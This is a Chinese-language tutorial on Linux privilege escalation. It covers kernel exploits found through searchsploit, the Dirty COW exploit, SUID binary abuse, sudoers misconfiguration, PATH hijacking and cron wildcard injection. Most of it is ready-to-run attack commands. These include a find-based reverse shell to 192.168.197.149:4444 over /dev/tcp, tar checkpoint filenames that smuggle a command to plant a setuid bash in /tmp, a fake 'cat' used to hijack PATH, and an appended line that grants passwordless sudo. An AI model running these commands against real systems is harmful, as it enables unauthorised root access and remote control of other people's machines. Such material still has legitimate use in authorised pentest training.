# Linux提权方法

## 内核提权

1. 常规提权方法

查看Linux内核版本

```bash
    uname -a
```

使用searchsploit搜索对应exp，并下载c文件进行编译：

```bash
    searchsploit ubunt 4.4.0
    searchsploit -m linux/local/45010.c
    gcc 45010.c -o 45010
```

在meterpreter下将编译好的exp上传到目标tmp目录下，赋予执行权限，可以看到执行后变为root权限

2. 赃牛提权

Linux内核的内存子系统在处理写时拷贝(Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞

影响版本：Linux kernel >= 2.6.22（2007年发行，到2016年10月18日才修复）

```bash
    uname -a
    cd CVE-2016-5195-master/
    make
    ./dcow -s
```

## suid提权

suid可以让文件调用者暂时获得文件拥有者的权限，suid提权的思路让普通用户运行root用户所拥有的suid文件，从而达到提权的目的。

可用于提权的文件列表：
    Nmap
    Vim
    find
    Bash
    More
    Less
    Nano
    cp

查找suid文件命令：

```bash
    find / -user root -perm -4000 -print 2>/dev/null
    find / -perm -u=s -type f 2>/dev/null
    find / -user root -perm -4000 -exec ls -ldb {} \;
```

使用find执行命令whoami发现是root
`find 1.txt -exec whoami \`

使用find执行反弹shell命令（注意加上-p参数，否则反弹回来的可能是低权限用户shell）：
`find 1.txt -exec bash -i >& /dev/tcp/192.168.197.149/4444 0>&1 -p \`

## sudo 提权

普通用户一般无法使用root用户命令，使用sudo命令可以让普通用户拥有root权限，但是一般都需要输入用户的密码。管理员为了运营方便可能会对sudoer文件进行不合理的配置，使普通用户不需要输入密码就可以使用sudo命令，从而导致权限提升的问题产生。
配置/etc/sudoers文件，在文件中加入：
`ubuntu ALL=(ALL:ALL) NOPASSWD:ALL`

配置完成后，普通用户使用sudo无需输入密码即可执行root命令：

## 环境变量提权

PATH是Linux和类Unix操作系统中的环境变量，它指定可执行程序的所有bin和sbin存储目录。当用户在终端上运行任何命令时，它会向shell发送请求以在PATH变量中搜索可执行文件来响应用户执行的命令。

```bash
    echo $PATH   #查看环境变量
```

演示：

假设管理员用户在/home/test目录下创建了一个demo.c文件，内容如下，执行查看shadow文件命令，setuid 规定了其运行用户，以root权限进行编译和权限设置：

```c
    #include<unistd.h>
    void main()
    {
        setuid(0);
        setgid(0);
        system("cat /etc/shadow");
    }
```

```bash
    gcc demo.c -o demo
    chmod u+s demo
```

执行demo文件即执行cat /etc/shadow命令

现在有一个攻击者拿到普通用户权限，首先执行如下命令查找具有suid的文件，发现demo
`find / -perm -u=s -type f 2>/dev/null`

接下来劫持环境变量进行提权：

```bash
    cd /tmp

    echo "/bin/bash" > cat   #创建名为cat的文件，内容为/bin/bash

    cat cat

    chmod 777 cat            #赋予777权限

    export PATH=/tmp:$PATH     #将tmp目录添加环境变量

    echo $PATH
```

最后执行demo，在执行cat命令时，从环境变量中查找，按查找顺序优先查找/tmp目录，而/tmp目录下的cat内容为/bin/bash，所以执行的命令从cat /etc/shadow就变成了/bin/bash /etc/shadow，从而达到提权的目的。

## Cronjobs提权

1. 通配符提权

查看定时任务，发现一个以root权限执行的任务test2.sh，查看test2.sh，发现任务的工作为每分钟执行将/home/ubuntu下的所有内容打包为backup.tar.gz并放置在/tmp目录下（通配符*代表目录下的所有文件）。
`cat /etc/crontab #查看定时任务`

在/home/ubuntu目录下创建三个文件：

```bash
    echo "cp /bin/bash /tmp/bash;chmod +s /tmp/bash" > test.sh

    echo "" > --checkpoint=1    #文件名为--checkpoint=1

    echo "" > "--checkpoint-action=exec=sh test.sh"

    #文件名为--checkpoint-action=exec=sh test.sh
```

当定时任务触发后，使用了通配符*对整个文件夹进行打包，系统真正执行打包时，将目录下的文件一个一个传参给通配符执行打包操作，而在打包–checkpoint=1和–checkpoint-action=exec=sh test.sh时相当于执行如下命令：
`tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh test.sh`
而–checkpoint和–checkpoint-action正好时tar的参数，此处会被当作参数执行而非文件名打包。–checkpoint-action=exec=sh test.sh为执行test.sh文件，test.sh文件内容为复制bash到tmp目录并赋予suid，即可达到提权的目的：

2. 文件重写提权

由于管理员对定时文件权限错误分配而导致普通用户具有写权限，从而达到提权。
普通用户查看定时任务，发现datetest.sh为777权限而且为root用户

普通用户可在datetest.sh中写入命令，将bash复制到tmp并赋予suid：
`"cp /bin/bash /tmp/bash;chmod +s /tmp/bash" >> /usr/local/bin/datetest.sh`
